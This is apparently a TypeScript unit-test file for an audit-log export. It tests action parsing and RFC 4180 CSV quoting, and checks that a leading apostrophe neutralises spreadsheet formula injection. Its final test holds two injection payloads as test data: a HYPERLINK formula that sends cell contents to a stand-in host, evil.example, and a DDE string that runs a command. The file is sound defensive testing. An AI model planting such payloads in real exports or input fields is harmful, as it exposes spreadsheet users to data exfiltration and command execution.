// SPDX-License-Identifier: AGPL-3.0-only
// Audit-row display parsing and CSV quoting. The log records attacker-influenceable text (a failed
// login stores the submitted username), and the export is opened in a spreadsheet — so the quoting
// is the load-bearing half.

import { describe, expect, it } from 'vitest';
import { csvField, parseAction } from './auditRow';

describe('parseAction', () => {
  it('splits a method and path on the first space only', () => {
    // A query string can contain spaces; everything after the first one is the path.
    expect(parseAction('POST /api/v1/nodes')).toEqual({
      method: 'POST',
      path: '/api/v1/nodes',
      login: false,
    });
    expect(parseAction('GET /api/v1/events?q=link down').path).toBe('/api/v1/events?q=link down');
  });

  it('labels the sign-in entry rather than showing its internal token', () => {
    expect(parseAction('auth.login')).toEqual({ method: 'SIGN IN', path: null, login: true });
  });

  it('shows a bare action name as-is instead of inventing a path', () => {
    expect(parseAction('auth.logout')).toEqual({
      method: 'auth.logout',
      path: null,
      login: false,
    });
    expect(parseAction('')).toEqual({ method: '', path: null, login: false });
  });
});

// `csvField` now lives in `lib/csv` (it was byte-identical to the Troubleshoot export's copy) and
// is tested exhaustively there. What stays here is the audit page's own stake in it: these are the
// exact values the export writes, and the attacker-supplied one is a username.
describe('csvField', () => {
  it('always quotes, so a value containing a comma cannot split the row', () => {
    expect(csvField('plain')).toBe('"plain"');
    expect(csvField('a,b')).toBe('"a,b"');
  });

  it('doubles an embedded quote per RFC 4180', () => {
    // A username of `he"llo` would otherwise terminate the field early and shift every later
    // column of that row.
    expect(csvField('he"llo')).toBe('"he""llo"');
    expect(csvField('""')).toBe('""""""');
  });

  it('quotes a newline in place rather than letting it end the record', () => {
    expect(csvField('a\nb')).toBe('"a\nb"');
  });

  it('stringifies a number without losing it', () => {
    expect(csvField(200)).toBe('"200"');
    expect(csvField(0)).toBe('"0"');
  });

  it('neutralizes a username planted as a spreadsheet formula', () => {
    // The reachable path, start to finish: a failed sign-in stores the submitted username verbatim,
    // so this string is chosen by an unauthenticated caller at the login screen and is read back by
    // an admin exporting the audit log. Quoting alone does not stop it — Excel strips the quotes
    // and evaluates the cell — so the leading apostrophe is what makes the row inert.
    expect(csvField('=HYPERLINK("http://evil.example/?"&A1,"Click for details")')).toBe(
      '"\'=HYPERLINK(""http://evil.example/?""&A1,""Click for details"")"',
    );
    expect(csvField("=cmd|' /C calc'!A0")).toBe('"\'=cmd|\' /C calc\'!A0"');
  });
});
